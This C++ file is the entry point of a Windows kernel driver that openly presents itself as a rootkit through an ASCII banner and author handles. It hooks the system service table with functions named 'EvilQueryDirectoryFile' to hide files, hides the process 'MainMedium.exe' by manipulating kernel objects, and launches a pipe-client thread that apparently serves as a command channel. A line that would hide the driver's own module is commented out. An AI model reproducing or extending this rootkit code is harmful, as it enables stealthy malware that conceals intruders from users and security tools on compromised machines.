#include "piping.h"
#include "DKOM.h"
#pragma warning(disable : 4996)


extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    UNREFERENCED_PARAMETER(DriverObject);

    //DriverObject->DriverUnload = ShrootUnload;

    
    // Hide KMDFdriver system module from loaded modules list:
   // if (!NT_SUCCESS(kernelobjs_hiding::HideSystemModule(DriverObject, NULL))) {
        //ShrootUnload(DriverObject);
        //return STATUS_UNSUCCESSFUL;
    //}
    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, 'HkQr'))) {
        //ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, 'HkQx'))) {
        //ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(process::HideProcess(0, "MainMedium.exe", TRUE))) {
        //ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }


    const char* HelloMessage =
        "\n----------\n"
        " _____   _   _  ______ _____  _____ _______   __ ____ _______\n"
        "/ ____\\ | | | || ___  \\  _  |/  _  \\_    _/| / //_  _\\\\_   _/\n"
        "\\ `- -. | |_| || |_/  / | | || | | | | | | |/ /  | |    | |\n"
        " `- -. \\   _  ||     /| | | || | | | | | |    \\  | |    | |\n"
        "/\\__/  /  | | || |\\  \\\\ \\_/ /| \\_/ / | | | |\\  \\_| |_   | |\n"
        "\\____ / \\_| |_|| / \\__|\\___/ \\____/  |_| |_| \\_/\\___/   |_|\n\n"
        "Discord: bldysis#0868  GitHub: shaygitub\n"
        "\n----------\n";

    DbgPrintEx(0, 0, "%s", HelloMessage);

    
    // Execute pipe client thread:
    HANDLE PipeThread = NULL;
    NTSTATUS Status = PsCreateSystemThread(
        &PipeThread,
        GENERIC_ALL,
        NULL,
        NULL,
        NULL,
        (PKSTART_ROUTINE)PipeClient,
        NULL);

    if (!NT_SUCCESS(Status)){
        DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", Status);
        return STATUS_UNSUCCESSFUL;
    }
    ZwClose(PipeThread);
    return STATUS_SUCCESS;
}